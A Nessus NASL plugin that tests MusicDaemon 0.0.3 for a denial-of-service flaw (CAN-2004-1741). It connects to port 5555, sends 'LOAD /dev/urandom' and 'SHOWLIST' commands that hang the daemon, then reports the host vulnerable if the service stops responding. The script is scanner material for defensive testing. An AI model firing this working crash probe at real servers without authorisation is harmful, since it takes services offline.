#
# This script was written by Noam Rathaus
#
# See the Nessus Scripts License for details
#
# From: "cyber talon" <cyber_talon@hotmail.com>
# Subject: MusicDaemon <= 0.0.3 Remote /etc/shadow Stealer / DoS
# Date: 23.8.2004 17:36

if(description)
{
 script_id(14353);  
 script_cve_id("CAN-2004-1741");
 script_bugtraq_id(11006);
 script_version ("$Revision: 1.3 $");

 name["english"] = "Music Daemon Denial of Service";
 script_name(english:name["english"]);
 
 desc["english"] = "
The remote host is running MusicDaemon, a music player running as a server.

It is possible to cause the Music Daemon to stop responding to 
requests by causing it to load the /dev/random filename as its track list.

An attacker can cause the product to no longer respond to requests.

Solution : None at this time
Risk Factor: Medium";

 script_description(english:desc["english"]);
 
 summary["english"] = "Music Daemon DoS";
 script_summary(english:summary["english"]);
 
 script_category(ACT_KILL_HOST);
 
 script_copyright(english:"This script is Copyright (C) 2004 Noam Rathaus");
 
 family["english"] = "Remote file access";
 script_family(english:family["english"]);
 
 script_dependencie("find_service2.nasl");
 script_require_ports("Services/musicdaemon", 5555);
 exit(0);
}


port = get_kb_item("Services/musicdaemon");
if(!port)port = 5555;

if (  ! get_port_state(port) ) exit(0);

# open a TCP connection
soc = open_sock_tcp(port);
if(!soc) exit(0);

recv = recv_line(socket:soc, length: 1024);
if ("Hello" >< recv)
{
 data = string("LOAD /dev/urandom\r\n");
 send(socket:soc, data: data);

 data = string("SHOWLIST\r\n");
 send(socket:soc, data: data);

 close(soc);
 sleep(5);

 soc = open_sock_tcp(port);
 if(!soc) { security_hole(port:port); exit(0); }
 
 recv = recv_line(socket:soc, length: 1024, timeout: 1);

 if ("Hello" >!< recv) security_hole(port:port);
}
